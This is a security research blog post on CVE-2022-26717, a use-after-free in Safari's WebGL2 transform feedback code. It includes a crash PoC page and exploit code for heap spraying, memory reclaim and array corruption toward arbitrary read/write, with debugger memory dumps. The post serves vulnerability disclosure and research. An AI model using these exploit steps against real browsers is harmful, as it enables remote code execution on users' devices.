---
layout: post
title: "Exploiting Safari's ANGLE Component"
author: theori
description:
categories: [ research ]
tags: [ WebKit, Safari, RCE, Use After Free ]
comments: true
featured: true
image: assets/images/2022-05-18/safari.png
---


In early 2022, I found interesting bug in WebKit WebGL Component by code audit. this bug is exploitable and effected macOS/iOS Safari. this bug assigned **CVE-2022-26717** in [security content of Safari 15.5](https://support.apple.com/en-us/HT213260)

The following items are affected by this bug:

- macOS
    - Safari 15.2 (17612.3.6.1.6) on macOS 12.0.1 (x64, M1)
    - Safari 15.2 (17612.3.6.1.6) on macOS 12.1 (x64, M1)
    - Safari 15.3 (17612.4.9.1.5) on macOS 12.2 (x64, M1)

- iOS 
    - 15.2.1 (iPhone 12 Mini)
    - 15.3 (iPhone X)

In this post, share a detail description of the bug and exploit stuff.

## Short WebGL backgrounds

WebGL(Web Graphics Library) is a JavaScript API for rendering 2D and 3D graphics within any compatible web browser without the use Plugins.

Also, WebGL uses the **ANGLE**(Almost Native Graphics Layer Engine) project as a backend to support the same level of rendering on multiple platforms.

WebGL have a version 1/2(aka WebGL1, WebGL2), the WebGL2 is totally support to WebGL1.

The standards for WebGL1,2 are defined by the Kronos Group.
- WebGL1 : https://www.khronos.org/registry/webgl/specs/latest/1.0/
- WebGL2 : https://www.khronos.org/registry/webgl/specs/latest/2.0/

In Safari Browser, **officially supports WebGL2 since version 15.**

The features added to WebGL2 are as follows.

- Vertex Array Object
- Uniform Buffer Object
- texture formats
- Samplers
- **Transform Feedback**
- ... (for more features, [https://webgl2fundamentals.org/webgl/lessons/webgl2-whats-new.html](https://webgl2fundamentals.org/webgl/lessons/webgl2-whats-new.html))

In above lists, the bug exists in Transform Feedback(aka XFB) feature.

>>Transform Feedback is the process of capturing Primitives generated by the Vertex Processing step(s), recording data from those primitives into Buffer Objects.\
This allows one to preserve the post-transform rendering state of an object and resubmit this data multiple times.

> In short, it captures the output of the vertex shader to a buffer object. the captured data is used when rendering at high speed using only GPU without CPU by using it during next draw.

If you want to know more about this feature, [Here](https://webgl2fundamentals.org/webgl/lessons/webgl-gpgpu.html)'s a nice explanation of transform feedback!


## Root Cause Analysis & PoC

The bug exists this code snippet.

* ./safari-612.3.6.1.6/Source/ThirdParty/ANGLE/src/libANGLE/renderer/metal/ContextMtl.mm
```c++
angle::Result ContextMtl::handleDirtyGraphicsTransformFeedbackBuffersEmulation(
    const gl::Context *context)
{
//...skipped
for (size_t bufferIndex = 0; bufferIndex < bufferCount; ++bufferIndex)
{
    BufferMtl *bufferHandle = bufferHandles[bufferIndex]; //[1]
    ASSERT(bufferHandle);
    ASSERT(mRenderEncoder.valid());
    uint32_t actualBufferIdx = actualXfbBindings[bufferIndex];
    assert(actualBufferIdx < mtl::kMaxShaderBuffers && "Transform Feedback Buffer Index should be initialized.");
    mRenderEncoder.setBufferForWrite(
        gl::ShaderType::Vertex, bufferHandle->getCurrentBuffer(), 0, actualBufferIdx); //[2]
}
//...skipped
```

`handleDirtyGraphicsTransformFeedbackBuffersEmulation` is called with the following call stack when calling the `drawArrays` method of WebGL.

- call `drawArrays` of WebGL2 with JS code.
- ContextMtl::setupDraw
- ContextMtl::setupDrawImpl
- ContextMtl::handleDirtyGraphicsTransformFeedbackBuffersEmulation

In `[1]`, gets the `BufferMtl` object from the `bufferHandles[bufferIndex]`. but, `bufferHandles` may have already freed `BufferMtl`.

The crash occurs when `getCurrentBuffer` in the code above tries to get the already freed buffer object `[2]`. 

Here is the PoC code for this bug.

* poc.html

```html
<html>
    <head>
        <META HTTP-EQUIV="Pragma" CONTENT="no-cache">
        <META HTTP-EQUIV="Expires" CONTENT="-1">
    </head>    
    <script type="vertex" id="vs">
        #version 300 es
        
        layout (location=0) in vec4 position;
        layout (location=1) in vec3 color;
        
        out vec3 vColor;
        out float sum;

        void main() {
            vColor = color;
            gl_Position = position;
        }
    </script>
    <script type="fragment" id="fs">
        #version 300 es
        precision highp float;
        
        in vec3 vColor;
        out vec4 fragColor;

        void main() {
            fragColor = vec4(vColor, 1.0);
        }
    </script>
    <body onload="poc()">
        <canvas id="canvas" width="1024" height="1024"></canvas>
    </body>

    <script>        
        function build_link_program()
        {
            var vsSource = document.getElementById("vs").text.trim();
            var fsSource = document.getElementById("fs").text.trim();
            
            var vertexShader = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vertexShader, vsSource);
            gl.compileShader(vertexShader);

            if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
                console.error(gl.getShaderInfoLog(vertexShader));
            }

            var fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fragmentShader, fsSource);
            gl.compileShader(fragmentShader);

            if (!gl.getShaderParameter(fragmentShader, gl.COMPILE_STATUS)) {
                console.error(gl.getShaderInfoLog(fragmentShader));
            }

            var program = gl.createProgram();
            gl.attachShader(program, vertexShader);
            gl.attachShader(program, fragmentShader);

            gl.transformFeedbackVaryings(
                program,
                ['sum'],
                gl.SEPARATE_ATTRIBS,
            );        

            gl.linkProgram(program);

            if (!gl.getProgramParameter(program, gl.LINK_STATUS)) {
                console.error(gl.getProgramInfoLog(program));
            }
            return program;            
        }

        function poc()
        {
            canvas = document.getElementById("canvas");
            gl = canvas.getContext("webgl2"); //create to webgl2 context.
            gl.clearColor(0, 0, 0, 1);

            var program = build_link_program();
            gl.useProgram(program);

            var positions = new Float32Array([
                -0.5, -0.5, 0.0,
                0.5, -0.5, 0.0,
                0.0, 0.5, 0.0
            ]);
            const tf = gl.createTransformFeedback();
            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);

            var ab = new ArrayBuffer( 0x1c8 );
            var f64 = new Float64Array(ab);
            var data = new Uint8Array(ab).fill(0x41);

            var sumBuffer = gl.createBuffer();
            
            gl.bindBuffer(gl.ARRAY_BUFFER, sumBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, 24, gl.STATIC_DRAW);        
            
            gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER, 0, sumBuffer);
            
            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, null);

            var positionBuffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, positionBuffer);
            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
            gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, tf);
            gl.beginTransformFeedback(gl.TRIANGLES);

            var dummy = gl.createBuffer();
            gl.bindBuffer( gl.ARRAY_BUFFER, dummy);

            gl.deleteBuffer( sumBuffer );

            gl.drawArrays(gl.TRIANGLES, 0, 3);
        }
    </script>
</html>
```


## Detail exploit scenario

Following is the exploit steps.

1. Heap spray to JSArray butterflies with Dobule and Contigous indexing type.

2. Trigger Bug
    - 2.1. At that time, since the butterfly address for the JSArray object is not known exactly, the most frequently used address is used statically.

3. Search to 'vector length' is 0x605 and the first element value is 0x1010000000000 in the sprayed butterfly.
    - 3.1. these values are written by the vulnerability.

4. Based on the corrupted array in step3, change the length of the next array to 0x1338, leaking valid JScell.

5. After that, overwrite the JIT region with addrof/fakeobj/read64/write64 primitive.
6. JIT code is written as shellcode that does the following:
    - sets the rax, rcx, rdx, rdi, rsi registers to 0x1337.
    - int 3.

The following codes describe the main codes in the above sequence. 

step 2 and 3 are important.

### 1. butterfly spray

```javascript
function array_spray(value)
{
    for(let i=0;i<SPRAY_SIZE;i++)
    {
        tmp = new Array();
        tmp2 = new Array();
        g_double_array.push(tmp);
        g_contigous_array.push(tmp2);
        tmp[0] = 0.0;
        tmp[1] = qwordAsFloat(floatAsQword(value)+0x5d); //[1]
        tmp[2] = 0.0;
        tmp[3] = 0.0;

        tmp2[0] = tmp;
        tmp2[1] = evil_array_content;
        tmp2[2] = evil_array_content;
    }
}
//...
addr_list = [ qwordAsFloat(0x8515baca8) ]; //[2]
```

above `array_spray` creates a butterfly with the following shape and heap sprays it. For Example, 

```plaintext
0x8d8104030: 0x0000000500000004 //g_double_array vector length | public length
0x8d8104038: 0x0000000000000000 //[0] <- This address is used in the trigger function
0x8d8104040: 0x00000008515bad05 //[1]
0x8d8104048: 0x0000000000000000 //[2]
0x8d8104050: 0x0000000000000000 //[3]
0x8d8104058: 0x7ff8000000000000
0x8d8104060: 0x0000000500000003 //g_contigous_array vector length | public length
0x8d8104068: 0x00000001c49f54c0 //g_double_array's element
0x8d8104070: 0x00000001b822e068 //evil_array_content
0x8d8104078: 0x00000001b822e068 //evil_array_content
0x8d8104080: 0x0000000000000000
0x8d8104088: 0x0000000000000000
```


### 2. trigger the bug

```javascript
//...
for(let cnt=0;cnt<addr_list.length;cnt++) {
    for(let j=0;j<5;j++) {
        if(found)
            break;
        trigger(addr_list[cnt]);                    
//...
```
The trigger function uses the address where the sprayed butterfly described in step 1 exists as an argument. 

The following is the main part of the trigger function. 

```javascript
function trigger(value)
{
    //...
    g_f64.fill(value);
    g_f64[0] = 0.0;
    g_f64[1] = 0.0;

    g_f64[15] = 0.0;
    g_f64[16] = 0.0;
    g_f64[17] = 0.0;
    g_f64[18] = 0.0;
    g_f64[55] = qwordAsFloat( floatAsQword(value)-0x30 );
    g_f64[56] = 0.0;
    g_f64[57] = 0.0;
    g_f64[58] = 0.0;
//..trigger code
```

g_f64 is a Float64Array object that attackers use to write values to the freed memory region.

If you look at the code, 0.0 (0x000...00) is entered for each specific offset, which was used to prevent crashes during exploit execution.

`g_f64[55]` is any address may be used as long as it is a writeable memory area address. 

The following is the memory when reallocated properly in the trigger function above.

```plaintext
(lldb) br set -n getCurrentBuffer
Breakpoint 1: where = libANGLE-shared.dylib`rx::BufferHolderMtl::getCurrentBuffer() const, address = 0x00007ffa28c62186
(lldb) c
Process 17555 resuming
Process 17555 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x00007ffa28c62186 libANGLE-shared.dylib`rx::BufferHolderMtl::getCurrentBuffer() const
libANGLE-shared.dylib`rx::BufferHolderMtl::getCurrentBuffer:
->  0x7ffa28c62186 <+0>: push   rbp
    0x7ffa28c62187 <+1>: mov    rbp, rsp
    0x7ffa28c6218a <+4>: push   r14
    0x7ffa28c6218c <+6>: push   rbx
Target 0: (com.apple.WebKit.WebContent) stopped.
(lldb) x/10a $rsi
0x7fdb3d94c8f8: 0x00000008515baca8 //will be correct butterfly address.
0x7fdb3d94c900: 0x00000008515baca8
0x7fdb3d94c908: 0x00000008515bac78 //g_f64[55], butterfly address - 0x30.
0x7fdb3d94c910: 0x0000000000000000
0x7fdb3d94c918: 0x0000000000000000
0x7fdb3d94c920: 0x0000000000000000
0x7fdb3d94c928: 0x00000008515baca8
0x7fdb3d94c930: 0x00000008515baca8
0x7fdb3d94c938: 0x00000008515baca8
0x7fdb3d94c940: 0x00000008515baca8
```

### 3. find to corrupted array.

```javascript
for(let i=0;i<SPRAY_SIZE;i++)
{
    if( floatAsQword(g_double_array[i][0]) == 0x1010000000000 ) //find corrupted array.
    {
        corrupted_array = g_double_array[i];
        corrupted_array[11] = qwordAsFloat( 0x0000133800001338 ); //set to vector/public length
        for(let i=0;i<SPRAY_SIZE;i++) {
            if(g_double_array[i].length == 0x1338) {
                found = true;
                g_index = i;
                fake_array = g_double_array[i];
            }
        }                    
        break;
    }
} //end spray-array for loop
```

This code finds for index 0 at 0x10100000000 in the sprayed array.

The reason for this is as follows.

```c++
angle::Result ContextMtl::handleDirtyGraphicsTransformFeedbackBuffersEmulation(
    const gl::Context *context)
//...
mRenderEncoder.setBufferForWrite(
    gl::ShaderType::Vertex, bufferHandle->getCurrentBuffer(), 0, actualBufferIdx);
//...
```

By the vulnerability, getCurrentBuffer is controlled by an attacker and the `setBufferForWrite` method is called.

The `setBufferForWrite` method consequently calls `setUsedByCommandBufferWithQueueSerial`.

followibng is the `setBufferForWrite` method.

```c++
RenderCommandEncoder &RenderCommandEncoder::setBufferForWrite(gl::ShaderType shaderType,
    const BufferRef &buffer,
    uint32_t offset,
    uint32_t index)
{
    //...
    cmdBuffer().setWriteDependency(buffer);
    //...
}
```

```c++
void CommandBuffer::setWriteDependency(const ResourceRef &resource)
{
    //...
    resource->setUsedByCommandBufferWithQueueSerial(mQueueSerial, true);
}
```

```c++
void Resource::setUsedByCommandBufferWithQueueSerial(uint64_t serial, bool writing)
{
    if (writing)
    {
        mUsageRef->cpuReadMemNeedSync = true;
        mUsageRef->cpuReadMemDirty    = true;
    }

    mUsageRef->cmdBufferQueueSerial = std::max(mUsageRef->cmdBufferQueueSerial, serial);
}
```

`setUsedByCommandBufferWithQueueSerial` should be inlined, So we check `CommandBuffer::setWriteDependency`. 

The following is a part of the assembly for `CommandBuffer::setWriteDependency`.

```assembly
libANGLE-shared.dylib`rx::mtl::CommandBuffer::setWriteDependency:
    0x7ffa28dc4530 <+0>:   push   rbp
    0x7ffa28dc4531 <+1>:   mov    rbp, rsp
    0x7ffa28dc4534 <+4>:   push   r15
    0x7ffa28dc4536 <+6>:   push   r14
    0x7ffa28dc4538 <+8>:   push   rbx
    0x7ffa28dc4539 <+9>:   push   rax
    //...
    0x7ffa28dc4561 <+49>:  mov    rax, qword ptr [r15]
    0x7ffa28dc4564 <+52>:  mov    rcx, qword ptr [rbx + 0x18]
    0x7ffa28dc4568 <+56>:  mov    rax, qword ptr [rax + 0x8]
    0x7ffa28dc456c <+60>:  mov    word ptr [rax + 0x8], 0x101 //[1]
    0x7ffa28dc4572 <+66>:  mov    rdx, qword ptr [rax]
    0x7ffa28dc4575 <+69>:  cmp    rdx, rcx
    0x7ffa28dc4578 <+72>:  cmovb  rdx, rcx
    0x7ffa28dc457c <+76>:  mov    qword ptr [rax], rdx //[2]
    //...
```

If the bug is successfully triggered, `rax` register has a valid butterfly.

In [1], 0x101 is written in the index 0 of the nth array of `g_double_array`, and the vector length is set in [2].

The following is the memory after the above code is executed.

```plaintext
(lldb) x/32a 0x8515baca8
0x8515baca8: 0x0000000000000000
0x8515bacb0: 0x00000008515bad05 //<- Here you need to write where the (6) will be written. Write the address +5 to write to the vector length of the next array.
0x8515bacb8: 0x0000000000000000
0x8515bacc0: 0x0000000000000000
0x8515bacc8: 0x7ff8000000000000
0x8515bacd0: 0x0000000500000003
0x8515bacd8: 0x000000053cb63ca0
0x8515bace0: 0x0000000508514480
0x8515bace8: 0x0000000508514480
0x8515bacf0: 0x0000000000000000
0x8515bacf8: 0x0000000000000000
0x8515bad00: 0x000006050000000c //<- vector length becomes 0x605, You can now fully access below memory for this length.
0x8515bad08: 0x0001010000000000 //<- The index 0 value of array becomes 0x0001010000000000.
0x8515bad10: 0x00000008515bad05
0x8515bad18: 0x0000000000000000
0x8515bad20: 0x0000000000000000
0x8515bad28: 0x7ff8000000000000
0x8515bad30: 0x0000000500000003
0x8515bad38: 0x000000053cb63cc0
0x8515bad40: 0x0000000508514480
0x8515bad48: 0x0000000508514480
0x8515bad50: 0x0000000000000000
0x8515bad58: 0x0000000000000000
0x8515bad60: 0x0000133800001338 //<- change the next array length based on the vector length 0x605 array.
0x8515bad68: 0x010824070000b152
0x8515bad70: 0x0000000508514488
0x8515bad78: 0x0000000000000000
0x8515bad80: 0x0000000000000000
0x8515bad88: 0x7ff8000000000000
0x8515bad90: 0x0000000500000003
0x8515bad98: 0x0000000822b00070
0x8515bada0: 0x00000005085ec7e0
```

We find the array where the index 0 value is 0x0001010000000000, and modify the vector and public length of the next array.

Now we have a double array of length 0x1338.

You can use this array to create JSCell value leaks, fakeobj/addrof

### 4. valid JSCell | structure id leak

```javascript
//...
fake_array[0] = qwordAsFloat(0x0008240700000828);  //fake jscell | not valid structure id, //[1]
fake_array[1] = fake_array[6];  //fake_array[6] is original array. //[2]
fake_array[6] = qwordAsFloat( floatAsQword( addr_list[0] ) + 0xc0); //[3]
//-------
var jscell = g_contigous_array[g_index][0][0]; //[4]
fake_array[0] = jscell; //store to valid jscell id & structure id
//...
```

Above code gets the correct `jscell` and `structure id`.

[1]. Write fake jscell and invalid structure id in index 0 of fake_array.\
[2]. Put the index 6 value of fake_array (the address of the tmp array) into the index 1 of fake_array.\
[3]. Put the index 0 address of fake_array into the index 6 element of fake_array. (The index 6 element of fake_array is the index 0 element of g_contigous_array.)\
[4]. Now, when the index 0 element of g_contigous_array is read, the JSCell and Structure ID of the tmp array are gets.

```plaintext
//...
0x8515bad60: 0x0000133800001338
0x8515bad68: 0x0008240700000828 //[0] fake jscell | not valid structure id, 
0x8515bad70: 0x000000011dad0f20 //[1] address of tmp array
0x8515bad78: 0x0000000000000000
0x8515bad80: 0x0000000000000000
0x8515bad88: 0x7ff8000000000000
0x8515bad90: 0x0000000500000003 //<- g_contigous_array Nth length
0x8515bad98: 0x00000008515bad68 //<- g_contigous_array Nth index 0.
```

All that remains is to implement addrof and fakeobj. If you have followed well up to this point, you should be able to implement it well enough.

The exploit(without fakeobj/addrof) and PoC can be found [here](https://github.com/singi/safari-0day-webgl).


## Exploit Demo
![Exploit](http://singi.io/demo.gif)


## Conclusion
>New features may present new attack surfaces and vulnerabilities.\
>Whether you're auditing code or building a fuzzer, first check out what's new! 
>If it is hidden by a flag, it is also necessary to observe how that code changes.


## Credits
- Jeonghoon Shin([@singi21a](https://twitter.com/singi21a)) of Theori

## References
- [https://en.wikipedia.org/wiki/WebGL](https://en.wikipedia.org/wiki/WebGL)
- [https://webgl2fundamentals.org/webgl/lessons/webgl2-whats-new.html](https://webgl2fundamentals.org/webgl/lessons/webgl2-whats-new.html)
- [https://webgl2fundamentals.org/webgl/lessons/webgl-gpgpu.html](https://webgl2fundamentals.org/webgl/lessons/webgl-gpgpu.html)
- [https://www.khronos.org/registry/webgl/specs/latest/2.0/](https://www.khronos.org/registry/webgl/specs/latest/2.0/)
